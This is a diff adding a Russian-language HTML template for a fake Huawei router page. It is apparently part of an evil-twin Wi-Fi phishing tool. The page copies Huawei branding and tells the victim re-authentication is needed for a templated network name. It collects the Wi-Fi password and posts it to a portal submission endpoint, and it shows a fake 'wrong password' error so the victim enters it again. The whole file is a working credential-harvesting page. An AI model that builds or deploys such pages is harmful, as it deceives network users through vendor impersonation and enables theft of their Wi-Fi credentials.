@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Huawei Router</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh}
+.hdr{background:#CF0A2C;padding:0 20px;height:52px;display:flex;align-items:center;justify-content:space-between}
+.hdr-brand{color:#fff;font-size:18px;font-weight:700;letter-spacing:.5px}
+.hdr-sub{color:rgba(255,255,255,.7);font-size:11px}
+.hero{background:#CF0A2C;padding:20px 20px 44px;color:#fff}
+.hero h1{font-size:18px;font-weight:700;margin-bottom:7px}
+.hero p{font-size:13px;opacity:.9;line-height:1.6}
+.hero .ssid{font-weight:700}
+.wrap{max-width:420px;margin:-22px auto 0;padding:0 16px 36px;position:relative}
+.card{background:#fff;border-radius:12px;padding:24px;box-shadow:0 4px 18px rgba(0,0,0,.12)}
+.card h3{font-size:14px;color:#CF0A2C;font-weight:700;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid #f0f0f0}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;color:#666;margin-bottom:5px;font-weight:600}
+input[type=text],input[type=password]{width:100%;padding:11px 13px;border:1.5px solid #e0e0e0;border-radius:7px;font-size:14px;outline:none;-webkit-appearance:none}
+input[type=text]:focus,input[type=password]:focus{border-color:#CF0A2C;box-shadow:0 0 0 2px rgba(207,10,44,.08)}
+input[readonly]{background:#fafafa;color:#888}
+.btn{width:100%;padding:13px;background:#CF0A2C;color:#fff;border:none;border-radius:7px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative}
+.btn:active{background:#a00820}
+.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
+.error{display:none;background:#fff0f0;border:1px solid #ffc0c0;border-radius:6px;padding:10px;font-size:12px;color:#c0392b;margin-top:10px}
+.footer{text-align:center;margin-top:14px;font-size:11px;color:#bbb}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-brand">HUAWEI</div>
+  <div class="hdr-sub">Router Management</div>
+</div>
+<div class="hero">
+  <h1>Huawei Router</h1>
+  <p>Введите пароль для подключения к <span class="ssid">{{SSID}}</span>.<br>Требуется повторная аутентификация.</p>
+</div>
+<div class="wrap">
+  <div class="card">
+    <h3>Настройка беспроводной сети</h3>
+    <form method="POST" action="/api/portal/submit" id="frm">
+      <input type="hidden" name="ssid" value="{{SSID}}">
+      <input type="hidden" name="vendor" value="huawei">
+      <div class="field">
+        <label>Имя сети (SSID)</label>
+        <input type="text" value="{{SSID}}" readonly>
+      </div>
+      <div class="field">
+        <label>Пароль Wi-Fi</label>
+        <input type="password" name="password" placeholder="Введите пароль сети" required autocomplete="off" minlength="8">
+      </div>
+      <button type="submit" class="btn" id="sbtn">
+        Применить
+        <div class="spin" id="sp"></div>
+      </button>
+    </form>
+    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
+  </div>
+  <div class="footer">Huawei Technologies Co., Ltd.</div>
+</div>
+<script>
+document.getElementById('frm').addEventListener('submit',function(){
+  document.getElementById('sp').style.display='block';
+  document.getElementById('sbtn').disabled=true;
+});
+if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
+</script>
+</body>
+</html>
